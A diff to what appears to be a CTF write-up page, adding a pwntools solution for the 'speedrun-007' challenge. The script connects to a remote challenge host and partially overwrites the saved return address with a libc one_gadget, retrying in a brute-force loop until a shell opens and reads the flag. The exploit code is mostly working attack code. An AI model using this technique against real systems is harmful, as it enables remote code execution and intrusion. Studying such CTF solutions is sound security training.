@@ -204,6 +204,58 @@ icon: icon-html
 
   
 
+* speedrun-007
+
+  ```python
+  # -*- coding: UTF-8 -*-
+  from pwn import *
+  context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
+  # rbp + 0x238 => <__libc_start_main+231>
+  #ca:0650│   0x7ffdcf9d9d58 —▸ 0x7fab6ece7b97 (__libc_start_main+231) ◂— mov    edi, eax
+  #83:0418│ rbp  0x7ffdcf9d9b20 —▸ 0x7ffdcf9d9d30 —▸ 0x7ffdcf9d9d50 —▸ 0x55e820d58a00 ◂— push   r15
+  # rbp -0x400 +0x638
+  #hex(-231-137904+0x4f322)
+  #
+  one_gadget = 0x4f322
+  while True:
+      r = remote('pwn2.blue-whale.me',19906)
+      #r = process(['./pwneta'],env = {"LD_PRELOAD":"./libc-2.27.so"})
+      r.recvuntil("What do you have this time")
+      r.send("a")
+      r.recvuntil("Changes you'd like to make (y/n)?")
+      r.send("y")
+      offset = 0x638
+      #gdb.attach(r)
+      r.send(p16(offset))
+      r.send(chr(0x22))
+      r.recvuntil("Changes you'd like to make (y/n)?")
+      r.send("y")
+      r.send(p16(offset+1))
+      r.send(chr(0xe3))
+      r.recvuntil("Changes you'd like to make (y/n)?")
+      r.send("y")
+      r.send(p16(offset+2))
+      r.send(chr(0xd6))
+      r.recvuntil("Changes you'd like to make (y/n)?")
+      r.send("n")
+      r.recvuntil('L8R.')
+      try:
+          r.sendline('cat flag')
+          a = r.recvuntil('}',timeout=1)
+          print(a)
+          if '{' in a:
+              print(a)
+              r.interactive()
+              break
+          r.close()
+  
+      except:
+          r.close()
+          continue
+  ```
+
+  
+
 * speedrun-008
 
   爆破canary
